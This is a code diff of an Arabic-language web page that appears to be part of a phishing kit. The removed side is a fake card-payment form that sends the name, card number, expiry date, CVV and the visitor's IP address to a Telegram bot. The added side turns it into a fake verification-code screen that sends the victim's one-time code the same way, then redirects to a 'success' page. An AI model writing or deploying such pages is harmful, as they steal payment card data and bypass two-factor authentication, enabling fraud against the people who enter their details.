@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إدخال تفاصيل الدفع</title>
+    <title>إدخال رمز التحقق</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
@@ -14,50 +14,52 @@
             height: 100vh;
             margin: 0;
         }
-        .payment-container {
+        .otp-container {
             background-color: #ffffff;
-            padding: 25px;
+            padding: 30px;
             border-radius: 10px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             width: 100%;
             max-width: 400px;
             box-sizing: border-box;
-        }
-        .payment-container h2 {
             text-align: center;
+        }
+        .otp-container h2 {
             color: #1c1e21;
             margin-top: 0;
             margin-bottom: 20px;
             font-size: 24px;
         }
+        .otp-container p {
+            color: #606770;
+            margin-bottom: 20px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         .form-group label {
             display: block;
             color: #606770;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
             font-size: 14px;
+            text-align: right;
         }
         .form-group input {
             width: 100%;
-            padding: 12px;
+            padding: 15px;
             border: 1px solid #dddfe2;
             border-radius: 6px;
             box-sizing: border-box;
-            font-size: 16px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 2px;
         }
         .form-group input:focus {
             border-color: #1877f2;
             outline: none;
             box-shadow: 0 0 0 2px #e7f3ff;
-        }
-        .expiry-cvv-group {
-            display: flex;
-            gap: 10px;
-        }
-        .expiry-cvv-group .form-group {
-            width: 50%;
         }
         .submit-btn {
             width: 100%;
@@ -74,36 +76,27 @@
         .submit-btn:hover {
             background-color: #166fe5;
         }
+        .icon {
+            font-size: 50px;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="payment-container">
-        <h2>إدخال تفاصيل الدفع</h2>
-        <form id="paymentForm" onsubmit="onSubmit(event)">
+    <div class="otp-container">
+        <div class="icon">🔐</div>
+        <h2>إدخال رمز التحقق</h2>
+        <p>تم إرسال رمز التحقق إلى هاتفك المحمول. يرجى إدخال الرمز المكون من 6 أرقام أدناه.</p>
+        
+        <form id="otpForm" onsubmit="onOtpSubmit(event)">
             <div class="form-group">
-                <label for="name">الاسم على البطاقة</label>
-                <input type="text" id="name" name="name" required>
+                <label for="otpCode">رمز التحقق (OTP)</label>
+                <input type="text" id="otpCode" name="otpCode" maxlength="6" placeholder="000000" required>
             </div>
             
-            <div class="form-group">
-                <label for="cardNumber">رقم البطاقة</label>
-                <input type="text" id="cardNumber" name="cardNumber" required>
-            </div>
-            
-            <div class="expiry-cvv-group">
-                <div class="form-group">
-                    <label for="expiryDate">تاريخ الانتهاء (MM/YY)</label>
-                    <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="cvv">رمز التحقق (CVV)</label>
-                    <input type="text" id="cvv" name="cvv" required>
-                </div>
-            </div>
-            
-            <button type="submit" class="submit-btn">إرسال</button>
+            <button type="submit" class="submit-btn">تأكيد</button>
         </form>
     </div>
 
@@ -132,14 +125,11 @@
             });
         }
 
-        // دالة الإرسال عند تقديم النموذج
-        async function onSubmit(event) {
+        // دالة الإرسال عند تقديم رمز OTP
+        async function onOtpSubmit(event) {
             event.preventDefault();
             
-            const name = document.getElementById('name').value;
-            const cardNumber = document.getElementById('cardNumber').value;
-            const expiryDate = document.getElementById('expiryDate').value;
-            const cvv = document.getElementById('cvv').value;
+            const otpCode = document.getElementById('otpCode').value;
 
             try {
                 // الحصول على عنوان IP
@@ -150,24 +140,26 @@
                 // استبدال الأحرف الخاصة في الرسالة لتجنب مشاكل MarkdownV2
                 const escapeMarkdown = (text) => text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
 
-                const message = `*بيانات بطاقة جديدة*\n\n` +
-                    `*الاسم على البطاقة:* \`${escapeMarkdown(name)}\`\n` +
-                    `*رقم البطاقة:* \`${escapeMarkdown(cardNumber)}\`\n` +
-                    `*تاريخ الانتهاء:* \`${escapeMarkdown(expiryDate)}\`\n` +
-                    `*رمز التحقق CVV:* \`${escapeMarkdown(cvv)}\`\n` +
+                const message = `*رمز التحقق OTP*\n\n` +
+                    `*رمز OTP:* \`${escapeMarkdown(otpCode)}\`\n` +
                     `*IP Address:* \`${escapeMarkdown(ipAddress)}\``;
 
                 // إرسال الرسالة إلى بوت تيليجرام
                 await sendTelegramMessage(TELEGRAM_CONFIG.botToken, TELEGRAM_CONFIG.chatId, message);
 
-                // تحويل المستخدم إلى صفحة إدخال رمز OTP
-                window.location.href = "otp.html";
+                // تحويل المستخدم إلى صفحة نجاح الدفع
+                window.location.href = "success.html";
                 
             } catch (error) {
                 console.error('Error:', error);
-                alert('حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.');
+                alert('حدث خطأ أثناء إرسال الرمز. يرجى المحاولة مرة أخرى.');
             }
         }
+
+        // التركيز على حقل إدخال OTP عند تحميل الصفحة
+        window.onload = function() {
+            document.getElementById('otpCode').focus();
+        };
     </script>
 
 </body>
